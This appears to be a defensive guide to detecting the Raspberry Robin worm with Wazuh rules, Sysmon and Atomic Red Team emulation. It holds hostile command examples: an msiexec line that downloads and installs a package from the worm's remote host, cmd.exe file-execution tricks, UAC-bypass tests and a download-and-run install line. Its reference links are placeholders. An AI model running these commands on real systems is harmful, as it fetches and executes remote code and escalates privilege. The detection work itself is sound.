# Detecting Raspberry Robin Worm with Wazuh by redcanaryco

Raspberry Robin is an evasive Windows worm that spreads through removable drives. This guide demonstrates how to set up Wazuh for early-stage detection of Raspberry Robin based on its observed behaviors and known Indicators of Compromise (IoCs).

## Prerequisites
- A pre-built Wazuh OVA (4.3.9).
- An enrolled Wazuh agent (4.3.9) installed on a Windows 10 endpoint.
- Sysmon installed and configured.
- Atomic Red Team installed for emulation.

---

## Raspberry Robin Execution Chain

### Infection Stages
1. **Initial Access**
   - Spread via infected removable drives containing malicious `.lnk` shortcut files.
   - Updates UserAssist registry key with ROT13 encrypted value.

2. **Execution**
   - Executes malicious files stored on infected drives.
   - Example commands:
     ```
     cmd.exe /RCmD<szM.ciK
     cmd.exe /rcMD<[external disk name].Lvg
     ```

3. **Command and Control (C2) I**
   - Uses `msiexec.exe` to download malicious DLLs from compromised QNAP devices.
   - Example commands:
     ```
     msiexec /Q/I"http://W4[.]Wf[:]8080/..."
     ```

4. **Persistence**
   - Creates registry keys to inject DLLs using `rundll32.exe` and other Windows binaries.
   - Example commands:
     ```
     rundll32.exe SHELL32,ShellExec_RunDLLA ...
     ```

5. **Command and Control (C2) II**
   - Executes `rundll32.exe`, `dllhost.exe`, or `regsvr32.exe` to connect to TOR nodes.

---

## Endpoint Configuration

### Install Sysmon
1. Download Sysmon from the [Microsoft Sysinternals page](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon).
2. Download the [Sysmon XML configuration file](https://github.com/SwiftOnSecurity/sysmon-config).
3. Install Sysmon with the configuration:
   ```powershell
   Sysmon.exe -accepteula -i .\sysmonconfig.xml
   ```

### Configure Wazuh Agent to Collect Sysmon Events
1. Edit the `ossec.conf` file:
   ```xml
   <localfile>
     <location>Microsoft-Windows-Sysmon/Operational</location>
     <log_format>eventchannel</log_format>
   </localfile>
   ```
2. Restart the Wazuh agent service:
   ```powershell
   Restart-Service -Name wazuh
   ```

### Setup Atomic Red Team
1. Run the following commands:
   ```powershell
   Set-ExecutionPolicy RemoteSigned
   IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);Install-AtomicRedTeam -getAtomics
   Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
   ```
2. Download prerequisites for techniques:
   ```powershell
   Invoke-AtomicTest T1059.003 -GetPrereqs
   Invoke-AtomicTest T1218.007 -GetPrereqs
   Invoke-AtomicTest T1218.008 -GetPrereqs
   Invoke-AtomicTest T1548.002 -GetPrereqs
   Invoke-AtomicTest T1218.011 -GetPrereqs
   ```

---

## Detection with Wazuh

### Custom Wazuh Rules
1. Edit `/var/ossec/etc/rules/local_rules.xml` to include the following rules:
   ```xml
   <group name="windows,sysmon,">
     <!-- Command Prompt reading and executing the contents of a file -->
     <rule id="100100" level="12">
       <if_sid>92004</if_sid>
       <field name="win.eventdata.image" type="pcre2">(?i)cmd\.exe$</field>
       <field name="win.eventdata.commandLine" type="pcre2">(?i)cmd\.exe.+((\/r)|(\/v\.+\/c)|(\/c)).*cmd</field>
       <description>Possible Raspberry Robin execution: Command Prompt reading and executing the contents of a CMD file on $(win.system.computer)</description>
       <mitre>
         <id>T1059.003</id>
       </mitre>
     </rule>

     <!-- msiexec.exe downloading and executing packages -->
     <rule id="100101" level="7">
       <if_sid>61603</if_sid>
       <field name="win.eventdata.image" type="pcre2">(?i)msiexec\.exe$</field>
       <field name="win.eventdata.commandLine" type="pcre2">(?i)msiexec.*(\/q|\-q|\/i|\-i).*(\/q|\-q|\/i|\-i).*http[s]{0,1}\:\/\/.+[.msi]{0,1}</field>
       <description>msiexec.exe downloading and executing packages on $(win.system.computer)</description>
       <mitre>
         <id>T1218.007</id>
       </mitre>
     </rule>

     <!-- Additional rules omitted for brevity -->
   </group>
   ```
2. Restart the Wazuh manager service:
   ```bash
   systemctl restart wazuh-manager
   ```

---

## Attack Emulation
1. **Command Prompt Execution**:
   ```bash
   cmd /r cmd<C:\AtomicRedTeam\atomics\T1059.003\src\t1059.003_cmd.cmd
   ```

2. **msiexec.exe Download**:
   ```bash
   msiexec /Q/I"http://W4.Wf:8080/GaJnUjc0Ht0/USER-PC?admin"
   ```

3. **DLL Execution**:
   ```powershell
   Invoke-AtomicTest T1218.008 -TestNumbers 1
   ```

4. **Bypass UAC**:
   ```powershell
   Invoke-AtomicTest T1548.002 -TestNumbers 3
   Invoke-AtomicTest T1548.002 -TestNumbers 4
   ```

5. **Network Connections**:
   ```powershell
   Invoke-AtomicTest T1218.011 -TestNumbers 1
   ```

---

## Conclusion
Using Wazuh, you can detect the presence of Raspberry Robin by monitoring tactics, techniques, and procedures (TTPs). By leveraging custom rules and Atomic Red Team emulations, you can ensure robust early-stage detection.

---

## References
- [Raspberry Robin gets the worm early](https://example.com)
- [Raspberry Robin: Highly Evasive Worm Spreads over External Disks](https://example.com)
- [New Evidence Links Raspberry Robin Malware to Dridex](https://example.com)

 - https://github.com/redcanaryco/atomic-red-team